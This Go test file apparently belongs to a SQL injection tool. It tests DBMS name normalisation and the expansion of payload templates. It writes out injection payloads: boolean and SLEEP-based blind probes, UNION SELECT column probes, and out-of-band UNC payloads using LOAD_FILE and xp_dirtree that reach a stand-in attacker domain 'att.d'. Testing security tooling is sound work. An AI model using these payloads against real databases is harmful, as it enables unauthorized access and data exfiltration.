package dbms

import (
	"strings"
	"testing"
)

func TestNormalizeName(t *testing.T) {
	cases := map[string]string{
		"MySQL":      MySQL,
		"MariaDB":    MySQL,
		"PostgreSQL": Postgres,
		"pgsql":      Postgres,
		"Redshift":   Postgres,
		"SQL Server": MSSQL,
		"Sybase":     MSSQL,
		"SAP ASE":    MSSQL,
		"Oracle":     Oracle,
		"sqlite3":    SQLite,
		"DB2":        Generic,
		"Firebird":   Generic,
	}
	for in, want := range cases {
		if got := NormalizeName(in); got != want {
			t.Errorf("NormalizeName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestExpandOrigAndMacros(t *testing.T) {
	if got := ExpandOrig("{orig} AND 1=1", "5"); got != "5 AND 1=1" {
		t.Fatalf("ExpandOrig = %q", got)
	}
	if got := Expand("{orig} AND SLEEP({delay})", Macros{Orig: "'", Delay: "5"}); got != "' AND SLEEP(5)" {
		t.Fatalf("Expand = %q", got)
	}
	if got := Expand("ORDER BY {n}", Macros{N: 4}); got != "ORDER BY 4" {
		t.Fatalf("Expand n = %q", got)
	}
	if got := Expand("{orig} UNION SELECT {cols}", Macros{Orig: "1", Cols: "NULL,NULL"}); got != "1 UNION SELECT NULL,NULL" {
		t.Fatalf("Expand cols = %q", got)
	}
}

func TestMySQLOOBEndsInUnc(t *testing.T) {
	p := Get(MySQL)
	if p == nil || len(p.OOB) == 0 {
		t.Fatal("mysql oob payloads missing")
	}
	// Template 0: literal backslashes. MySQL decodes \\ to \, so the SQL
	// literal needs four leading backslashes and two before the share to form
	// a standalone UNC \\att.d\a.
	got := Expand(p.OOB[0], Macros{Orig: "'", Domain: "att.d", Unc: "vx"})
	if !strings.Contains(got, `LOAD_FILE('\\\\att.d\\a')`) {
		t.Fatalf("oob template0 = %q", got)
	}
	// Template 1: CONCAT-built UNC using the {unc} macro.
	got2 := Expand(p.OOB[1], Macros{Orig: "'", Domain: "att.d", Unc: "vx"})
	if !strings.Contains(got2, `CONCAT(0x5c5c,'att.d',0x5c,'vx')`) {
		t.Fatalf("oob template1 = %q", got2)
	}
}

func TestPGAndMSSQLOOBUnc(t *testing.T) {
	pg := Get(Postgres)
	if len(pg.OOB) == 0 {
		t.Fatal("pg oob missing")
	}
	got := Expand(pg.OOB[0], Macros{Orig: "'", Domain: "att.d", Unc: "vx"})
	// PG string literal with E-escapes: \\\\ -> \\ after PG's own decoding.
	if !strings.Contains(got, `'\\\\att.d\\vx'`) {
		t.Fatalf("pg oob = %q", got)
	}
	ms := Get(MSSQL)
	if len(ms.OOB) == 0 {
		t.Fatal("mssql oob missing")
	}
	gotM := Expand(ms.OOB[0], Macros{Orig: "'", Domain: "att.d", Unc: "vx"})
	// MSSQL keeps backslashes verbatim: the literal must already be the UNC.
	if !strings.Contains(gotM, `master..xp_dirtree '\\att.d\vx'`) {
		t.Fatalf("mssql oob = %q", gotM)
	}
}

func TestUnionBuildColumns(t *testing.T) {
	for _, ps := range All() {
		for _, tpl := range ps.Union.UnionSelect {
			got := Expand(tpl, Macros{Orig: "1", Cols: "NULL,NULL,NULL"})
			if !strings.Contains(got, "NULL,NULL,NULL") {
				t.Errorf("union tpl %q lost cols: %q", tpl, got)
			}
		}
	}
}

func TestAllHasGenericFallbackAndNonEmptyBoolean(t *testing.T) {
	all := All()
	if len(all) == 0 {
		t.Fatal("All() empty")
	}
	if Get(Generic) == nil {
		t.Fatal("generic payloads must exist")
	}
	for _, p := range all {
		if len(p.Boolean) == 0 {
			t.Errorf("%s has no boolean pairs", p.Name)
		}
	}
}

func TestStackable(t *testing.T) {
	if Stackable(Get(MySQL)) != true {
		t.Error("mysql should be stackable")
	}
	if Stackable(Get(SQLite)) != false {
		t.Error("sqlite should not be stackable")
	}
	if HasOOB(Get(SQLite)) {
		t.Error("sqlite must not carry oob payloads")
	}
}
